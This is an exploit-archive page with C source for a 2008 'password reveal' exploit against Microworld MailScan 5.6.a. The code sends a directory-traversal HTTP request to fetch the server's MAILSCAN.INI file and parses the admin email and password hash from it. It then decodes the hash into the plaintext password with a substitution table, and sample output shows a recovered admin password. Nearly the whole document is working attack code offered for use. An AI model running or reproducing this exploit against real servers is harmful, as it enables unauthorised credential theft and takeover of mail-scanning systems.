<html><head><title>Microworld Mailscan 5.6.a Password Reveal Exploit</title></head><pre>/*
----------------------------------------------------------------------------------------------

       _____           ____
      / ___/___  _____/ __ \___ _   __
      \__ \/ _ \/ ___/ / / / _ \ | / /
     ___/ /  __/ /__/ /_/ /  __/ |/ /
    /____/\___/\___/_____/\___/|___/
    [2008]  SecurityDevelopment.net


  Author: SlaYeR
  Date: 25. Aug. 2008
  Email: slayer@securitydevelopment.net
  Website: www.securitydevelopment.net
  IRC: dragon.overfl0w.org #securitydevelopment.net

----------------------------------------------------------------------------------------------

Exploit based on the advisory from Oliver Karow @
http://securityvulns.com/Udocument375.html

- MailScan for Mail Servers

    * Version: 5.6.a with espatch1
    * Win32 Platform

Other Mailscan Products, Versions, also, if available
for other platforms, were not tested.


I used the Directory Traversal methode to access the ini file of mailscan
application to gain some importend data.
After some research i found out that the password algorithm was extreamly
weak. So i decided to code a exploit for it.


15. Aug. 2008 - Advisory release
20. Aug. 2008 - SlaYeR founds out about the advisory
21. Aug. 2008 - Found out about the ini file
22. Aug. 2008 - Found out about the weak algorithm and coded a sploit for it.
25. Aug. 2008 - Private version done.
04. Sep. 2008 - Hotfix released by Microworld.
09. Sep. 2008 - Public release


Some special greets to:
Dams - He helped me with some stupid errors inside the decode_hash function
JGS - He helped me with the spliting hash part
Mikke8 - He didn't helped me but i like hem;)

Team Ph0enix - Cuz they Own

----------------------------------------------------------------------------------------------

Example:

         _____           ____
        / ___/___  _____/ __ \___ _   __
        \__ \/ _ \/ ___/ / / / _ \ | / /
       ___/ /  __/ /__/ /_/ /  __/ |/ /
      /____/\___/\___/_____/\___/|___/
      [2008]  SecurityDevelopment.net

 - Microworld Mailscan 5.6.a password reveal exploit -
               Coded by: SlaYeR


[!] Targeting 192.168.1.111:10443
[!] Building magic string!
[!] Connected to host!
[!] Building request!
[!] Opening target!
[+] SERVER: MailScan 5.6a
[+] ADMIN: insecure-mailscan@securitydevelopment.net
[+] HASH: GJBIAHALBCHIBJGJGGAEBMAFBIGGAGGKAIBJHLBMAEBJDHAPBH
[+] PASS: &quot;sl@y3r&quot;-owns-m!cr0word|\
[+] Done!


----------------------------------------------------------------------------------------------

*/




#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;wininet.h&gt;



#pragma comment(lib, &quot;wininet&quot;)
#pragma comment(lib,&quot;ws2_32&quot;)

char *SECDEV_ASCII=
&quot;         _____           ____           \n&quot;
&quot;        / ___/___  _____/ __ \\___ _   __\n&quot;
&quot;        \\__ \\/ _ \\/ ___/ / / / _ \\ | / /\n&quot;
&quot;       ___/ /  __/ /__/ /_/ /  __/ |/ / \n&quot;
&quot;      /____/\\___/\\___/_____/\\___/|___/  \n&quot;
&quot;      [2008]  SecurityDevelopment.net\r\n&quot;
&quot;\r\n&quot;
&quot; - Microworld Mailscan 5.6.a password reveal exploit -\r\n&quot;
&quot;               Coded by: SlaYeR\r\n&quot;
&quot;                          \r\n\r\n&quot;;


int decode_hash(char * string);
int Count;
int exploit(char *url,char *port);



int main(int argc, char *argv[])
{
 char *url = argv[1];
 char *port = argv[2];
 printf(SECDEV_ASCII);

 if( argc &lt;= 2 )
 {
  printf(&quot; Usage: %s &lt;IP&gt; &lt;PORT&gt;\n&quot;,argv[0]);
  return 0;
 }
 else
 {
  exploit(url,port);
 }
 return 0;
}


int exploit(char *url,char *port)
{
 printf(&quot;[!] Targeting %s:%s\n&quot;,url,port);


 HINTERNET httpopen, openurl;
 char buffer2[1024];
 DWORD read;
 char *check;
 char *string1 = &quot;http://&quot;;
 char *string2 = &quot;/../../../../PROGRA~1/MailScan/MAILSCAN.INI&quot;;
 char bigbuffer[1025];
 char buffer3[1025];
 char buffer4[1025];
 char buffer5[1025];
 char buffer6[1025];



 if(httpopen = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0))
 {
  printf(&quot;[!] Building request!\n&quot;);
  memset(bigbuffer,0,1025);
  memcpy(bigbuffer,string1,strlen(string1));
  memcpy(bigbuffer+strlen(bigbuffer),url,strlen(url));
  memcpy(bigbuffer+strlen(bigbuffer),&quot;:&quot;,strlen(&quot;:&quot;));
  memcpy(bigbuffer+strlen(bigbuffer),port,strlen(port));
  memcpy(bigbuffer+strlen(bigbuffer),string2,strlen(string2));
 }
 else
 {
  printf(&quot;[-] Error building request!\n&quot;);
  InternetCloseHandle(httpopen);
  CloseHandle(buffer2);
  return 0;
 }

 printf(&quot;[!] Trying to connect @ %s:%s\n&quot;,url,port);
 if(openurl = InternetOpenUrl(httpopen, bigbuffer, NULL, NULL,
INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL))
 {
  printf(&quot;[!] Connected to host!\n&quot;);
 }
 else
 {
  printf(&quot;[-] Error while connecting! \n&quot;);
  InternetCloseHandle(httpopen);
  InternetCloseHandle(openurl);
  CloseHandle(buffer2);
  return 0;
 }

 if(InternetReadFile(openurl, buffer2, sizeof(buffer2), &amp;read))
 {

  if(check = strstr(buffer2, &quot;[General]&quot;))
  {

   check = strstr(buffer2, &quot;UserPassword=&quot;);
   sscanf(check, &quot;UserPassword=%s &quot;, buffer3);

   check = strstr(buffer2, &quot;AdminEmailId=&quot;);
   sscanf(check, &quot;AdminEmailId=%s &quot;, buffer4);

   check = strstr(buffer2, &quot;ProductName=&quot;);
   sscanf(check, &quot;ProductName=%s &quot;, buffer5);

   check = strstr(buffer2, &quot;Version=&quot;);
   sscanf(check, &quot;Version=%s &quot;, buffer6);
  }




 if( check==NULL )
 {
  printf(&quot;[-] Server not vuln :(\n&quot;);

 }
 else
 {
  printf(&quot;[+] SERVER: %s %s\n&quot;,buffer5,buffer6);
  printf(&quot;[+] ADMIN: %s\n&quot;,buffer4);
  printf(&quot;[+] HASH: %s\n&quot;,buffer3);
  printf(&quot;[+] PASS: &quot;);

  char bufferfiller[sizeof(buffer3)];
  char temp[1025];

  memset(bufferfiller,0,sizeof(buffer3));

  for (int i=0;i &lt; strlen(buffer3); i++)
  {
   Count++;

   sprintf(temp,&quot;%c&quot;,buffer3[i]);
   memcpy(bufferfiller+strlen(bufferfiller),temp,strlen(temp));

   if(Count == 2)
   {
    char buf[255];
    memset(buf,0,sizeof(255));
    sprintf(buf,&quot;%s&quot;,bufferfiller);

    decode_hash(buf);
    memset(bufferfiller,0,1025);
    Count = 0;
   }
  }
  printf(&quot;\n[+] Done!\n&quot;);
 }
 }
 else
 {
  printf(&quot;[-] Server not vuln :(\n&quot;);
 }

 InternetCloseHandle(httpopen);
 InternetCloseHandle(openurl);
 CloseHandle(buffer2);

 return 0;
}


int decode_hash(char * string)
{

 // Yes it token me allot of work to wrote this down... (only default
charset)
 // if you want more just do it by yourself

 if( strcmp( string, &quot;DA&quot; ) == 0 ){printf(&quot;{&quot;);} if( strcmp( string, &quot;DG&quot;
) == 0 ){printf(&quot;}&quot;);}
 if( strcmp( string, &quot;BH&quot; ) == 0 ){printf(&quot;|&quot;);} if( strcmp( string, &quot;HB&quot;
) == 0 ){printf(&quot;:&quot;);}
 if( strcmp( string, &quot;GJ&quot; ) == 0 ){printf(&quot;\&quot;&quot;);} if( strcmp( string, &quot;HH&quot;
) == 0 ){printf(&quot;&lt;&quot;);}
 if( strcmp( string, &quot;HF&quot; ) == 0 ){printf(&quot;&gt;&quot;);} if( strcmp( string, &quot;HE&quot;
) == 0 ){printf(&quot;?&quot;);}
 if( strcmp( string, &quot;BA&quot; ) == 0 ){printf(&quot;[&quot;);} if( strcmp( string, &quot;BG&quot;
) == 0 ){printf(&quot;]&quot;);}
 if( strcmp( string, &quot;BH&quot; ) == 0 ){printf(&quot;\\&quot;);} if( strcmp( string, &quot;HA&quot;
) == 0 ){printf(&quot;;&quot;);}
 if( strcmp( string, &quot;GM&quot; ) == 0 ){printf(&quot;'&quot;);} if( strcmp( string, &quot;GH&quot;
) == 0 ){printf(&quot;,&quot;);}
 if( strcmp( string, &quot;GF&quot; ) == 0 ){printf(&quot;.&quot;);} if( strcmp( string, &quot;GE&quot;
) == 0 ){printf(&quot;/&quot;);}
 if( strcmp( string, &quot;DF&quot; ) == 0 ){printf(&quot;~&quot;);} if( strcmp( string, &quot;GK&quot;
) == 0 ){printf(&quot;!&quot;);}
 if( strcmp( string, &quot;AL&quot; ) == 0 ){printf(&quot;@&quot;);} if( strcmp( string, &quot;GI&quot;
) == 0 ){printf(&quot;#&quot;);}
 if( strcmp( string, &quot;GP&quot; ) == 0 ){printf(&quot;$&quot;);} if( strcmp( string, &quot;GO&quot;
) == 0 ){printf(&quot;%&quot;);}
 if( strcmp( string, &quot;BF&quot; ) == 0 ){printf(&quot;^&quot;);} if( strcmp( string, &quot;GN&quot;
) == 0 ){printf(&quot;&amp;&quot;);}
 if( strcmp( string, &quot;GB&quot; ) == 0 ){printf(&quot;*&quot;);} if( strcmp( string, &quot;GD&quot;
) == 0 ){printf(&quot;(&quot;);}
 if( strcmp( string, &quot;BE&quot; ) == 0 ){printf(&quot;_&quot;);} if( strcmp( string, &quot;GA&quot;
) == 0 ){printf(&quot;+&quot;);}
 if( strcmp( string, &quot;GG&quot; ) == 0 ){printf(&quot;-&quot;);} if( strcmp( string, &quot;HG&quot;
) == 0 ){printf(&quot;=&quot;);}
 if( strcmp( string, &quot;AK&quot; ) == 0 ){printf(&quot;a&quot;);} if( strcmp( string, &quot;AJ&quot;
) == 0 ){printf(&quot;b&quot;);}
 if( strcmp( string, &quot;AI&quot; ) == 0 ){printf(&quot;c&quot;);} if( strcmp( string, &quot;AP&quot;
) == 0 ){printf(&quot;d&quot;);}
 if( strcmp( string, &quot;AO&quot; ) == 0 ){printf(&quot;e&quot;);} if( strcmp( string, &quot;AN&quot;
) == 0 ){printf(&quot;f&quot;);}
 if( strcmp( string, &quot;AM&quot; ) == 0 ){printf(&quot;g&quot;);} if( strcmp( string, &quot;AD&quot;
) == 0 ){printf(&quot;h&quot;);}
 if( strcmp( string, &quot;AC&quot; ) == 0 ){printf(&quot;i&quot;);} if( strcmp( string, &quot;AB&quot;
) == 0 ){printf(&quot;j&quot;);}
 if( strcmp( string, &quot;AA&quot; ) == 0 ){printf(&quot;k&quot;);} if( strcmp( string, &quot;AH&quot;
) == 0 ){printf(&quot;l&quot;);}
 if( strcmp( string, &quot;AG&quot; ) == 0 ){printf(&quot;m&quot;);} if( strcmp( string, &quot;AF&quot;
) == 0 ){printf(&quot;n&quot;);}
 if( strcmp( string, &quot;AE&quot; ) == 0 ){printf(&quot;o&quot;);} if( strcmp( string, &quot;BL&quot;
) == 0 ){printf(&quot;p&quot;);}
 if( strcmp( string, &quot;BK&quot; ) == 0 ){printf(&quot;q&quot;);} if( strcmp( string, &quot;BJ&quot;
) == 0 ){printf(&quot;r&quot;);}
 if( strcmp( string, &quot;BI&quot; ) == 0 ){printf(&quot;s&quot;);} if( strcmp( string, &quot;BP&quot;
) == 0 ){printf(&quot;t&quot;);}
 if( strcmp( string, &quot;BO&quot; ) == 0 ){printf(&quot;u&quot;);} if( strcmp( string, &quot;BN&quot;
) == 0 ){printf(&quot;v&quot;);}
 if( strcmp( string, &quot;BM&quot; ) == 0 ){printf(&quot;w&quot;);} if( strcmp( string, &quot;BD&quot;
) == 0 ){printf(&quot;x&quot;);}
 if( strcmp( string, &quot;BC&quot; ) == 0 ){printf(&quot;y&quot;);} if( strcmp( string, &quot;BB&quot;
) == 0 ){printf(&quot;z&quot;);}
 if( strcmp( string, &quot;HK&quot; ) == 0 ){printf(&quot;1&quot;);} if( strcmp( string, &quot;HJ&quot;
) == 0 ){printf(&quot;2&quot;);}
 if( strcmp( string, &quot;HI&quot; ) == 0 ){printf(&quot;3&quot;);} if( strcmp( string, &quot;HP&quot;
) == 0 ){printf(&quot;4&quot;);}
 if( strcmp( string, &quot;HO&quot; ) == 0 ){printf(&quot;5&quot;);} if( strcmp( string, &quot;HN&quot;
) == 0 ){printf(&quot;6&quot;);}
 if( strcmp( string, &quot;HM&quot; ) == 0 ){printf(&quot;7&quot;);} if( strcmp( string, &quot;HD&quot;
) == 0 ){printf(&quot;8&quot;);}
 if( strcmp( string, &quot;HC&quot; ) == 0 ){printf(&quot;9&quot;);} if( strcmp( string, &quot;HL&quot;
) == 0 ){printf(&quot;0&quot;);}
 if( strcmp( string, &quot;GC&quot; ) == 0 ){printf(&quot;)&quot;);} if( strcmp( string, &quot;GL&quot;
) == 0 ){printf(&quot; &quot;);}

 return 0;
}

// milw0rm.com [2008-09-09]</pre></html>